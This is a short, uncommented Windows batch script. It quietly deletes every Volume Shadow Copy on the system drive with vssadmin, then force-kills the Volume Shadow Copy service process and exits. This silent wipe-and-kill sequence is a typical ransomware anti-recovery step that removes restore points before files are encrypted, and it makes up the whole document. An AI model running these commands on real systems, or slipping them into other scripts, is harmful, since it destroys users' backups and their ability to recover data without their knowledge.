vssadmin delete shadows /for=%SystemDrive% /all /quiet
timeout 2
taskkill /f /t /im VSSVC.exe
exit